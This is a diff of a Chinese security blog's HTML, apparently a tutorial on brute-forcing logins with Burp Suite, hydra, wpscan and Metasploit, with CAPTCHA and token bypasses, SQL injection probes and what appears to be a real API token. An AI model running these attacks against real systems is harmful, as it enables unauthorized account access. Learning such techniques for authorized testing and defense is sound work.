@@ -234,7 +234,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-03-18 00:12:06" itemprop="dateModified" datetime="2025-03-18T00:12:06+08:00">2025-03-18</time>
+      <time title="修改时间：2025-03-18 00:17:19" itemprop="dateModified" datetime="2025-03-18T00:17:19+08:00">2025-03-18</time>
     </span>
 
   
@@ -376,87 +376,87 @@
 </tr>
 </tbody></table>
 <h2 id="2-burpsuite穷举后台密码"><a href="#2-burpsuite穷举后台密码" class="headerlink" title="2 burpsuite穷举后台密码"></a>2 burpsuite穷举后台密码</h2><p>抓包，然后放到Intruder模块，添加payload位置</p>
-<img src="/posts/undefined/image-20250312225424438.png" class="" title="image-20250312225424438">
+<img src="/posts/e93fc31a/image-20250312225424438.png" class="" title="image-20250312225424438">
 
 <p>加载payloads</p>
-<img src="/posts/undefined/image-20250312225451754.png" class="" title="image-20250312225451754">
+<img src="/posts/e93fc31a/image-20250312225451754.png" class="" title="image-20250312225451754">
 
 <p>开始攻击，爆破出密码</p>
-<img src="/posts/undefined/image-20250312225540034.png" class="" title="image-20250312225540034">
+<img src="/posts/e93fc31a/image-20250312225540034.png" class="" title="image-20250312225540034">
 
 <p>成功登录后台</p>
-<img src="/posts/undefined/image-20250312225644180.png" class="" title="image-20250312225644180">
+<img src="/posts/e93fc31a/image-20250312225644180.png" class="" title="image-20250312225644180">
 
 
 
 <h2 id="3-带有Token防御的穷举爆破"><a href="#3-带有Token防御的穷举爆破" class="headerlink" title="3 带有Token防御的穷举爆破"></a>3 带有Token防御的穷举爆破</h2><p>有的网站存在一次性Token，再用过一次后就失效了，导致没办法爆破</p>
-<img src="/posts/undefined/image-20250312230827144.png" class="" title="image-20250312230827144">
+<img src="/posts/e93fc31a/image-20250312230827144.png" class="" title="image-20250312230827144">
 
 <p>这里可以使用burpsuite的宏设置，打开<code>Settings</code>中的<code>Session</code>。</p>
-<img src="/posts/undefined/image-20250312231604753.png" class="" title="image-20250312231604753">
+<img src="/posts/e93fc31a/image-20250312231604753.png" class="" title="image-20250312231604753">
 
 <p>添加规则，选择运行宏。</p>
-<img src="/posts/undefined/image-20250312231626743.png" class="" title="image-20250312231626743">
+<img src="/posts/e93fc31a/image-20250312231626743.png" class="" title="image-20250312231626743">
 
 <p>选择添加宏</p>
-<img src="/posts/undefined/image-20250312231721421.png" class="" title="image-20250312231721421">
+<img src="/posts/e93fc31a/image-20250312231721421.png" class="" title="image-20250312231721421">
 
 <p>这里选择包含Token的响应</p>
-<img src="/posts/undefined/image-20250312231837586.png" class="" title="image-20250312231837586">
+<img src="/posts/e93fc31a/image-20250312231837586.png" class="" title="image-20250312231837586">
 
 <p>选择项目设置，在自定义参数位置添加，选择要获取的参数，这里要注意<strong>参数名一定要一致</strong></p>
-<img src="/posts/undefined/image-20250312232023480.png" class="" title="image-20250312232023480">
+<img src="/posts/e93fc31a/image-20250312232023480.png" class="" title="image-20250312232023480">
 
 <p>一通确认，将更改参数名设置一下</p>
-<img src="/posts/undefined/image-20250312232151766.png" class="" title="image-20250312232151766">
+<img src="/posts/e93fc31a/image-20250312232151766.png" class="" title="image-20250312232151766">
 
 <p>可以更改一下作用范围</p>
-<img src="/posts/undefined/image-20250312232336232.png" class="" title="image-20250312232336232">
+<img src="/posts/e93fc31a/image-20250312232336232.png" class="" title="image-20250312232336232">
 
 <p>然后就可以开始爆破了，不过还是会有一些几率替换失败，感觉是爆破线程过高的原因，调低线程以后爆破成功了。</p>
-<img src="/posts/undefined/image-20250312233222030.png" class="" title="image-20250312233222030">
+<img src="/posts/e93fc31a/image-20250312233222030.png" class="" title="image-20250312233222030">
 
 
 <h2 id="4-针对有验证码的穷举爆破"><a href="#4-针对有验证码的穷举爆破" class="headerlink" title="4 针对有验证码的穷举爆破"></a>4 针对有验证码的穷举爆破</h2><h3 id="4-1-Cookie不存在不验证绕过"><a href="#4-1-Cookie不存在不验证绕过" class="headerlink" title="4.1 Cookie不存在不验证绕过"></a>4.1 Cookie不存在不验证绕过</h3><p>在请求包Cookie中存在字段<code>PHPSESSID</code></p>
-<img src="/posts/undefined/image-20250312234452887.png" class="" title="image-20250312234452887">
+<img src="/posts/e93fc31a/image-20250312234452887.png" class="" title="image-20250312234452887">
 
 <p>其值其实对应于一个文件</p>
-<img src="/posts/undefined/image-20250312234548755.png" class="" title="image-20250312234548755">
+<img src="/posts/e93fc31a/image-20250312234548755.png" class="" title="image-20250312234548755">
 
 <p>这里如果对其没有验证，则可以删除<code>PHPSESSID</code>实现绕过，爆破成功</p>
-<img src="/posts/undefined/image-20250312234722354.png" class="" title="image-20250312234722354">
+<img src="/posts/e93fc31a/image-20250312234722354.png" class="" title="image-20250312234722354">
 
-<img src="/posts/undefined/image-20250312234834804.png" class="" title="image-20250312234834804">
+<img src="/posts/e93fc31a/image-20250312234834804.png" class="" title="image-20250312234834804">
 
 <h3 id="4-2-后台验证码不销毁绕过"><a href="#4-2-后台验证码不销毁绕过" class="headerlink" title="4.2 后台验证码不销毁绕过"></a>4.2 后台验证码不销毁绕过</h3><p>有的网站验证码在使用后不会销毁，可以复用，达到绕过</p>
-<img src="/posts/undefined/image-20250312235311801.png" class="" title="image-20250312235311801">
+<img src="/posts/e93fc31a/image-20250312235311801.png" class="" title="image-20250312235311801">
 
-<img src="/posts/undefined/image-20250312235427207.png" class="" title="image-20250312235427207">
+<img src="/posts/e93fc31a/image-20250312235427207.png" class="" title="image-20250312235427207">
 
 <h3 id="4-3-验证码识别爆破"><a href="#4-3-验证码识别爆破" class="headerlink" title="4.3 验证码识别爆破"></a>4.3 验证码识别爆破</h3><p>使用验证码识别工具，直接识别出验证码值，进行爆破</p>
-<img src="/posts/undefined/image-20250313000046133.png" class="" title="image-20250313000046133">
+<img src="/posts/e93fc31a/image-20250313000046133.png" class="" title="image-20250313000046133">
 
 <p>这里正常抓包，添加爆破位置，添加验证码路径，载入字典即可，在载入字典时需修改<code>Line Endings</code>为<code>Windows</code>，不然字典导不进去</p>
-<img src="/posts/undefined/image-20250313000648523.png" class="" title="image-20250313000648523">
+<img src="/posts/e93fc31a/image-20250313000648523.png" class="" title="image-20250313000648523">
 
-<img src="/posts/undefined/image-20250313001039560.png" class="" title="image-20250313001039560">
+<img src="/posts/e93fc31a/image-20250313001039560.png" class="" title="image-20250313001039560">
 
 <p>填写验证码错误信息，即可开始爆破</p>
-<img src="/posts/undefined/image-20250313001105420.png" class="" title="image-20250313001105420">
+<img src="/posts/e93fc31a/image-20250313001105420.png" class="" title="image-20250313001105420">
 
 
 
 <h2 id="5-一些常见软件登录穷举"><a href="#5-一些常见软件登录穷举" class="headerlink" title="5 一些常见软件登录穷举"></a>5 一些常见软件登录穷举</h2><h3 id="5-1-phpmyadmin"><a href="#5-1-phpmyadmin" class="headerlink" title="5.1 phpmyadmin"></a>5.1 phpmyadmin</h3><p>通常爆破<code>admin</code>，<code>root</code>，<code>test</code>用户密码</p>
-<img src="/posts/undefined/image-20250317212314918.png" class="" title="image-20250317212314918">
+<img src="/posts/e93fc31a/image-20250317212314918.png" class="" title="image-20250317212314918">
 
 <p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-159062.htm">下载地址</a></p>
 <h3 id="5-2-WordPress"><a href="#5-2-WordPress" class="headerlink" title="5.2 WordPress"></a>5.2 WordPress</h3><p>可以拼接路径，查看账户信息<code>/wp-json/wp/v2/users</code></p>
-<img src="/posts/undefined/image-20250317215045138.png" class="" title="image-20250317215045138">
+<img src="/posts/e93fc31a/image-20250317215045138.png" class="" title="image-20250317215045138">
 
 <p>使用<code>WPScan</code>工具，首先在<a target="_blank" rel="noopener" href="https://wpscan.com/">WPScan</a>注册账户获取<code>token</code>，使用以下命令</p>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wpscan --url http://xxx.com -e u -P ./top1000.txt --api-token 6qGDsJorRIvSazNIg9s4mwjxX8nOUPRL3to6fdJgwoo</span><br></pre></td></tr></tbody></table></figure>
 
-<img src="/posts/undefined/image-20250317215215191.png" class="" title="image-20250317215215191">
+<img src="/posts/e93fc31a/image-20250317215215191.png" class="" title="image-20250317215215191">
 
 <h2 id="6-hydra工具使用"><a href="#6-hydra工具使用" class="headerlink" title="6 hydra工具使用"></a>6 hydra工具使用</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-l login 小写，指定用户名进行破解</span><br><span class="line">-L file 大写，指定用户的用户名字典</span><br><span class="line">-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。</span><br><span class="line">-P file 大写，用于指定密码字典。</span><br><span class="line">-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探</span><br><span class="line">-M file 指定目标ip列表文件，批量破解。</span><br><span class="line">-o file 指定结果输出文件</span><br><span class="line">-f 找到第一对登录名或者密码的时候中止破解。</span><br><span class="line">-t tasks 同时运行的线程数，默认是16</span><br><span class="line">-w <span class="keyword">time</span> 设置最大超时时间，单位</span><br><span class="line">-v / -V 显示详细过程</span><br><span class="line">-R 恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）</span><br><span class="line">-x 自定义密码</span><br></pre></td></tr></tbody></table></figure>
 
@@ -468,43 +468,43 @@
 <p>使用<code>hydra</code>对ssh密码进行爆破</p>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hydra -l root -P ./top500.txt -e ns -vV -t 1 -f 192.168.31.50 ssh</span><br></pre></td></tr></tbody></table></figure>
 
-<img src="/posts/undefined/image-20250317232800500.png" class="" title="image-20250317232800500">
+<img src="/posts/e93fc31a/image-20250317232800500.png" class="" title="image-20250317232800500">
 
 <h3 id="6-2-ftp"><a href="#6-2-ftp" class="headerlink" title="6.2 ftp"></a>6.2 ftp</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hydra -l c5moon -P ./top500.txt -e ns -vV 192.168.31.51 ftp</span><br></pre></td></tr></tbody></table></figure>
 
-<img src="/posts/undefined/image-20250317233427264.png" class="" title="image-20250317233427264">
+<img src="/posts/e93fc31a/image-20250317233427264.png" class="" title="image-20250317233427264">
 
 <h3 id="6-3-mysql"><a href="#6-3-mysql" class="headerlink" title="6.3 mysql"></a>6.3 mysql</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hydra -l root -P ./top500.txt -e ns -vV -f 192.168.31.57 mysql</span><br></pre></td></tr></tbody></table></figure>
 
-<img src="/posts/undefined/image-20250317233635882.png" class="" title="image-20250317233635882">
+<img src="/posts/e93fc31a/image-20250317233635882.png" class="" title="image-20250317233635882">
 
 <h3 id="6-4-smb"><a href="#6-4-smb" class="headerlink" title="6.4 smb"></a>6.4 smb</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hydra -l administrator -P ./top500.txt -e ns -vV -f 192.168.31.57 smb</span><br></pre></td></tr></tbody></table></figure>
 
-<img src="/posts/undefined/image-20250317234038917.png" class="" title="image-20250317234038917">
+<img src="/posts/e93fc31a/image-20250317234038917.png" class="" title="image-20250317234038917">
 
 <h3 id="6-5-rdp"><a href="#6-5-rdp" class="headerlink" title="6.5 rdp"></a>6.5 rdp</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hydra -l administrator -P ./top500.txt -e ns -vV -f 192.168.31.57 rdp</span><br></pre></td></tr></tbody></table></figure>
 
-<img src="/posts/undefined/image-20250317234329708.png" class="" title="image-20250317234329708">
+<img src="/posts/e93fc31a/image-20250317234329708.png" class="" title="image-20250317234329708">
 
 <h3 id="6-6-http"><a href="#6-6-http" class="headerlink" title="6.6 http"></a>6.6 http</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hydra -l admin -P ./top500.txt -vV -f www.c1moon.com http-post-form <span class="string">"/admin/index.php:user=^USER^&amp;ps=^PASS^&amp;action=login:login-error"</span></span><br></pre></td></tr></tbody></table></figure>
 
-<img src="/posts/undefined/image-20250317235246581.png" class="" title="image-20250317235246581">
+<img src="/posts/e93fc31a/image-20250317235246581.png" class="" title="image-20250317235246581">
 
 <h3 id="6-7-mssql"><a href="#6-7-mssql" class="headerlink" title="6.7 mssql"></a>6.7 mssql</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hydra -l sa -P ./top500.txt -e ns -vV -f 192.168.31.57 mssql</span><br></pre></td></tr></tbody></table></figure>
 
-<img src="/posts/undefined/image-20250317235614010.png" class="" title="image-20250317235614010">
+<img src="/posts/e93fc31a/image-20250317235614010.png" class="" title="image-20250317235614010">
 
 <h3 id="6-8-redis"><a href="#6-8-redis" class="headerlink" title="6.8 redis"></a>6.8 redis</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hydra -P ./top500.txt -e ns -vV -f 192.168.31.57 redis</span><br></pre></td></tr></tbody></table></figure>
 
-<img src="/posts/undefined/image-20250317235842515.png" class="" title="image-20250317235842515">
+<img src="/posts/e93fc31a/image-20250317235842515.png" class="" title="image-20250317235842515">
 
 <h2 id="7-metasploite穷举模块"><a href="#7-metasploite穷举模块" class="headerlink" title="7 metasploite穷举模块"></a>7 metasploite穷举模块</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ msfconsole <span class="comment"># 启动msf</span></span><br><span class="line"></span><br><span class="line">msf6 &gt; search auxiliary/scanner/mssql/mssql_login <span class="comment"># 搜索模块</span></span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                 Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -  ----                                 ---------------  ----    -----  -----------</span><br><span class="line">   0  auxiliary/scanner/mssql/mssql_login  .                normal  No     MSSQL Login Utility</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/mssql/mssql_login</span><br><span class="line"></span><br><span class="line">msf6 &gt; use auxiliary/scanner/mssql/mssql_login <span class="comment"># 使用模块</span></span><br><span class="line">[*] New <span class="keyword">in</span> Metasploit 6.4 - The CreateSession option within this module can open an interactive session</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/mssql/mssql_login) &gt; info <span class="comment"># 查看模块信息</span></span><br></pre></td></tr></tbody></table></figure>
 
-<img src="/posts/undefined/image-20250318000514529.png" class="" title="image-20250318000514529">
+<img src="/posts/e93fc31a/image-20250318000514529.png" class="" title="image-20250318000514529">
 
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/mssql/mssql_login) &gt; show options <span class="comment"># 显示参数</span></span><br></pre></td></tr></tbody></table></figure>
 
-<img src="/posts/undefined/image-20250318001134113.png" class="" title="image-20250318001134113">
+<img src="/posts/e93fc31a/image-20250318001134113.png" class="" title="image-20250318001134113">
 
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/mssql/mssql_login) &gt; <span class="built_in">set</span> RHOSTS 192.168.31.57</span><br><span class="line">RHOSTS =&gt; 192.168.31.57</span><br><span class="line">msf6 auxiliary(scanner/mssql/mssql_login) &gt; <span class="built_in">set</span> STOP_ON_SUCCESS <span class="literal">true</span></span><br><span class="line">STOP_ON_SUCCESS =&gt; <span class="literal">true</span></span><br><span class="line">msf6 auxiliary(scanner/mssql/mssql_login) &gt; <span class="built_in">set</span> PASS_FILE ./top500.txt</span><br><span class="line">PASS_FILE =&gt; ./top500.txt</span><br><span class="line">msf6 auxiliary(scanner/mssql/mssql_login) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.31.57:1433    - 192.168.31.57:1433 - MSSQL - Starting authentication scanner.</span><br><span class="line">[!] 192.168.31.57:1433    - No active DB -- Credential data will not be saved!</span><br><span class="line">[-] 192.168.31.57:1433    - 192.168.31.57:1433 - LOGIN FAILED: WORKSTATION\sa: (Incorrect: )</span><br><span class="line">[+] 192.168.31.57:1433    - 192.168.31.57:1433 - Login Successful: WORKSTATION\sa:123456</span><br><span class="line">[*] 192.168.31.57:1433    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] 192.168.31.57:1433    - Bruteforce completed, 1 credential was successful.</span><br><span class="line">[*] 192.168.31.57:1433    - You can open an MSSQL session with these credentials and CreateSession <span class="built_in">set</span> to <span class="literal">true</span></span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></tbody></table></figure>
 
@@ -735,7 +735,7 @@
 <p>接下来将host修改为<code>%</code>即可。</p>
 <figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> host,<span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">'root'</span>;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></tbody></table></figure>
 
-<style>.pienrgywnrhj{zoom:50%;}</style><img src="/posts/31899/image-20250306000604769.png" class="pienrgywnrhj" alt="image-20250306000604769">
+<style>.ksjplucgjbsd{zoom:50%;}</style><img src="/posts/31899/image-20250306000604769.png" class="ksjplucgjbsd" alt="image-20250306000604769">
 
 
 <h3 id="1-2-判断是否存在注入"><a href="#1-2-判断是否存在注入" class="headerlink" title="1.2 判断是否存在注入"></a>1.2 判断是否存在注入</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">id<span class="operator">=</span><span class="string">'1'</span><span class="keyword">or</span><span class="string">'1'</span><span class="operator">=</span><span class="string">'1'</span></span><br><span class="line">id<span class="operator">=</span>"1"<span class="keyword">or</span>"1"<span class="operator">=</span>"1"</span><br></pre></td></tr></tbody></table></figure>
